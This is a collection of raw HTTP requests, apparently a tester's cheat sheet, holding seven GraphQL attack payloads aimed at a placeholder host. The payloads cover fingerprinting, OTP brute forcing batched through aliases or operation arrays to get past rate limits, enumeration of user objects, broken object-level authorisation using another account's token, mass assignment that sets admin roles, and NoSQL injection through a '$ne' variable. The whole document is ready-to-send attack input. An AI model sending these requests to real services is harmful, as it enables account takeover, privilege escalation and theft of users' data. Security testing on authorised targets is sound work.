### 1) confirm GraphQL + fingerprint
POST https://target.example.invalid/graphql HTTP/1.1
Host: target.example.invalid
Content-Type: application/json

{"query":"{__typename}"}

### 2) alias-batched OTP brute (N ops in ONE request where limit is 1/5)
POST https://target.example.invalid/graphql HTTP/1.1
Host: target.example.invalid
Content-Type: application/json

{"query":"mutation{ a:verifyOtp(userId:\"MINE\",code:\"000000\"){token} b:verifyOtp(userId:\"MINE\",code:\"000001\"){token} c:verifyOtp(userId:\"MINE\",code:\"000002\"){token} d:verifyOtp(userId:\"MINE\",code:\"000003\"){token} }"}

### 3) JSON-array batching (if engine accepts operation arrays)
POST https://target.example.invalid/graphql HTTP/1.1
Host: target.example.invalid
Content-Type: application/json

[{"query":"mutation{verifyOtp(userId:\"MINE\",code:\"000000\"){token}}"},{"query":"mutation{verifyOtp(userId:\"MINE\",code:\"000001\"){token}}"}]

### 4) alias enumeration (many objects, one request - BOLA scale proof)
POST https://target.example.invalid/graphql HTTP/1.1
Host: target.example.invalid
Content-Type: application/json

{"query":"{ a:user(id:1){id} b:user(id:2){id} c:user(id:3){id} d:user(id:4){id} }"}

### 5) BOLA via node(id) - A's token, B's id (two-account proof)
POST https://target.example.invalid/graphql HTTP/1.1
Host: target.example.invalid
Content-Type: application/json
Authorization: Bearer A_TOKEN

{"query":"{ node(id:\"VXNlcjoxMjQ=\"){ ... on User { id email } } }"}

### 6) mass-assignment via input object (read back after!)
POST https://target.example.invalid/graphql HTTP/1.1
Host: target.example.invalid
Content-Type: application/json
Authorization: Bearer A_TOKEN

{"query":"mutation{ updateUser(input:{ id:ME, role:\"admin\", isAdmin:true }){ id role } }"}

### 7) NoSQLi via typed JSON variable
POST https://target.example.invalid/graphql HTTP/1.1
Host: target.example.invalid
Content-Type: application/json

{"query":"query($id:JSON){ user(id:$id){email} }","variables":{"id":{"$ne":null}}}
